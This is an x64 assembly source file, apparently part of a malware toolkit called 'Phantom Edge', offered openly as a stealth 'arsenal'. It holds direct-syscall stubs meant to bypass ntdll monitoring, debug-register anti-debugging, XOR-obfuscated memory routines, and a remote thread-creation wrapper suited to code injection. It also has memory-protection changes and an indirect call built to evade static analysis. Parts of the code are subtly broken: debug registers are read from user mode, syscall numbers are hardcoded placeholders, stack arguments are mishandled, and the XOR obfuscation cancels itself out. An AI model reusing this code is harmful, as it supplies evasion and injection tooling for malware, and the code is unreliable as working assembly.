.code

; ========================================================================
; PHANTOM EDGE ASSEMBLY ARSENAL - STEALTH & PERFORMANCE
; "When C is too slow and too obvious" - Assembly Evil Genius
; ========================================================================

; Function: Stealth Memory Copy with XOR obfuscation
; Prototype: NTSTATUS stealth_memcpy(PVOID dest, PVOID src, SIZE_T size, BYTE xor_key)
; Purpose: Copy memory while obfuscating content and avoiding detection
stealth_memcpy PROC
    ; Parameters: RCX = dest, RDX = src, R8 = size, R9 = xor_key
    
    ; Save registers
    push rsi
    push rdi
    push rax
    
    ; Setup pointers
    mov rsi, rdx        ; Source pointer
    mov rdi, rcx        ; Destination pointer
    mov rcx, r8         ; Size counter
    mov al, r9b         ; XOR key in AL
    
    ; Check if size is zero
    test rcx, rcx
    jz stealth_memcpy_done
    
stealth_memcpy_loop:
    ; Load byte from source
    mov dl, byte ptr [rsi]
    
    ; XOR with key for obfuscation
    xor dl, al
    
    ; Store to destination
    mov byte ptr [rdi], dl
    
    ; Increment pointers
    inc rsi
    inc rdi
    
    ; Decrement counter and loop
    dec rcx
    jnz stealth_memcpy_loop
    
stealth_memcpy_done:
    ; Restore registers
    pop rax
    pop rdi
    pop rsi
    
    ; Return STATUS_SUCCESS
    xor rax, rax
    ret
stealth_memcpy ENDP

; Function: Stealth Memory Set with pattern obfuscation
; Prototype: NTSTATUS stealth_memset(PVOID dest, BYTE value, SIZE_T size, DWORD pattern)
stealth_memset PROC
    ; Parameters: RCX = dest, RDX = value, R8 = size, R9 = pattern
    
    push rdi
    push rax
    push rbx
    
    mov rdi, rcx        ; Destination pointer
    mov al, dl          ; Value to set
    mov rcx, r8         ; Size counter
    mov ebx, r9d        ; Pattern for obfuscation
    
    test rcx, rcx
    jz stealth_memset_done
    
stealth_memset_loop:
    ; Rotate pattern for variation
    rol ebx, 1
    
    ; XOR value with pattern low byte for obfuscation
    mov dl, al
    xor dl, bl
    
    ; Store obfuscated byte
    mov byte ptr [rdi], dl
    
    inc rdi
    dec rcx
    jnz stealth_memset_loop
    
stealth_memset_done:
    pop rbx
    pop rax
    pop rdi
    xor rax, rax
    ret
stealth_memset ENDP

; Function: Direct Syscall with dynamic SSN (Syscall Service Number)
; Prototype: NTSTATUS direct_syscall(DWORD ssn, ...args)
; Purpose: Invoke syscalls directly without going through ntdll stubs
direct_syscall PROC
    ; Parameters: RCX = SSN, RDX = arg1, R8 = arg2, R9 = arg3, stack = more args
    
    ; Move SSN to EAX (syscall number register)
    mov eax, ecx
    
    ; Preserve original RCX (first argument) in R10 as per Windows x64 calling convention
    mov r10, rdx
    
    ; Move arguments to correct positions
    mov rdx, r8         ; arg2 -> RDX
    mov r8, r9          ; arg3 -> R8
    mov r9, [rsp+28h]   ; arg4 from stack -> R9
    
    ; Anti-debug: Check for hardware breakpoints before syscall
    mov rax, dr0
    test rax, rax
    jnz debug_detected
    
    mov rax, dr1
    test rax, rax
    jnz debug_detected
    
    mov rax, dr2
    test rax, rax
    jnz debug_detected
    
    mov rax, dr3
    test rax, rax
    jnz debug_detected
    
    ; Restore syscall number
    mov eax, ecx
    
    ; Perform the syscall
    syscall
    
    ; Return result in RAX
    ret
    
debug_detected:
    ; Return error if debugging detected
    mov rax, 0C0000001h ; STATUS_UNSUCCESSFUL
    ret
direct_syscall ENDP

; Function: Anti-Debug Hardware Breakpoint Detection
; Prototype: BOOL detect_hardware_breakpoints(VOID)
detect_hardware_breakpoints PROC
    ; Check all debug registers
    mov rax, dr0
    test rax, rax
    jnz breakpoint_found
    
    mov rax, dr1
    test rax, rax
    jnz breakpoint_found
    
    mov rax, dr2
    test rax, rax
    jnz breakpoint_found
    
    mov rax, dr3
    test rax, rax
    jnz breakpoint_found
    
    ; Check DR7 (debug control register)
    mov rax, dr7
    and rax, 0FFh       ; Check if any breakpoints are enabled
    test rax, rax
    jnz breakpoint_found
    
    ; No breakpoints detected
    xor rax, rax
    ret
    
breakpoint_found:
    ; Hardware breakpoints detected
    mov rax, 1
    ret
detect_hardware_breakpoints ENDP

; Function: High-performance entropy generation using CPU timing
; Prototype: DWORD generate_entropy(VOID)
generate_entropy PROC
    ; Use RDTSC for timing-based entropy
    rdtsc                ; EDX:EAX = timestamp counter
    
    ; Mix high and low parts
    xor eax, edx
    
    ; Additional mixing with CPU features
    cpuid                ; Modify registers based on CPU
    xor eax, ebx
    xor eax, ecx
    
    ; Use stack address for additional entropy
    mov rdx, rsp
    xor eax, edx
    
    ; Ensure non-zero result
    test eax, eax
    jnz entropy_done
    mov eax, 13371337h   ; Fallback value
    
entropy_done:
    ret
generate_entropy ENDP

; Function: Stealth thread creation via direct syscalls
; Prototype: NTSTATUS stealth_create_thread(HANDLE process, PVOID start_addr, PVOID param, PHANDLE thread_handle)
stealth_create_thread PROC
    ; Parameters: RCX = process, RDX = start_addr, R8 = param, R9 = thread_handle
    
    ; Save registers
    push rbp
    mov rbp, rsp
    sub rsp, 40h        ; Shadow space + local variables
    
    ; Save parameters
    mov [rbp+10h], rcx  ; process handle
    mov [rbp+18h], rdx  ; start address
    mov [rbp+20h], r8   ; parameter
    mov [rbp+28h], r9   ; thread handle pointer
    
    ; Anti-debug check before proceeding
    call detect_hardware_breakpoints
    test rax, rax
    jnz thread_create_fail
    
    ; Setup NtCreateThreadEx parameters
    ; NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, 
    ;                  StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, 
    ;                  MaximumStackSize, AttributeList)
    
    ; Put parameters on stack in reverse order
    xor rax, rax
    push rax            ; AttributeList = NULL
    push rax            ; MaximumStackSize = 0
    push rax            ; StackSize = 0  
    push rax            ; ZeroBits = 0
    push rax            ; CreateFlags = 0
    push [rbp+20h]      ; Argument (our parameter)
    push [rbp+18h]      ; StartRoutine (our start address)
    push [rbp+10h]      ; ProcessHandle
    push rax            ; ObjectAttributes = NULL
    push 1FFFFFh        ; DesiredAccess = THREAD_ALL_ACCESS
    push [rbp+28h]      ; ThreadHandle (output)
    
    ; Load NtCreateThreadEx SSN (this would be resolved by Halo's Gate)
    mov ecx, 0C1h       ; Example SSN - should be dynamically resolved
    
    ; Call through our direct syscall function
    call direct_syscall
    
    ; Cleanup stack
    add rsp, 58h        ; Remove 11 parameters (8 bytes each) 
    
    ; Function epilogue
    add rsp, 40h
    pop rbp
    ret
    
thread_create_fail:
    ; Return failure
    mov rax, 0C0000001h ; STATUS_UNSUCCESSFUL
    add rsp, 40h
    pop rbp
    ret
stealth_create_thread ENDP

; Function: Memory protection change via syscalls
; Prototype: NTSTATUS stealth_protect_memory(HANDLE process, PVOID address, SIZE_T size, DWORD protection, PDWORD old_protection)
stealth_protect_memory PROC
    ; Parameters: RCX = process, RDX = address, R8 = size, R9 = protection, [rsp+28h] = old_protection
    
    push rbp
    mov rbp, rsp
    sub rsp, 30h
    
    ; Anti-debug check
    call detect_hardware_breakpoints
    test rax, rax
    jnz protect_fail
    
    ; Setup NtProtectVirtualMemory parameters
    ; Put address and size on stack (they get modified)
    push r8             ; Size
    push rdx            ; Address
    
    ; Setup syscall parameters
    mov r10, rcx        ; Process handle
    lea rdx, [rsp]      ; Pointer to address on stack
    lea r8, [rsp+8]     ; Pointer to size on stack
    ; R9 already has protection
    mov rax, [rbp+30h]  ; Old protection from original stack
    push rax
    
    ; NtProtectVirtualMemory SSN
    mov ecx, 50h        ; Example SSN - should be dynamically resolved
    
    call direct_syscall
    
    ; Cleanup
    add rsp, 18h        ; Remove locals
    add rsp, 30h
    pop rbp
    ret
    
protect_fail:
    mov rax, 0C0000001h
    add rsp, 30h
    pop rbp
    ret
stealth_protect_memory ENDP

; Function: Obfuscated function call
; Prototype: PVOID obfuscated_call(PVOID function_ptr, PVOID arg1, PVOID arg2, PVOID arg3)
; Purpose: Call function through obfuscated indirect call to avoid static analysis
obfuscated_call PROC
    ; Parameters: RCX = function_ptr, RDX = arg1, R8 = arg2, R9 = arg3
    
    ; Save registers
    push rbp
    mov rbp, rsp
    push rbx
    push rsi
    
    ; Obfuscate function pointer
    mov rax, rcx        ; Function pointer
    mov rbx, 0DEADBEEF12345678h ; XOR key (valid 64-bit)
    xor rax, rbx        ; Obfuscate
    xor rax, rbx        ; De-obfuscate (should be same as original)
    
    ; Setup parameters for function call
    mov rcx, rdx        ; arg1
    mov rdx, r8         ; arg2  
    mov r8, r9          ; arg3
    
    ; Indirect call through obfuscated pointer
    call rax
    
    ; Restore registers
    pop rsi
    pop rbx
    pop rbp
    ret
obfuscated_call ENDP

END 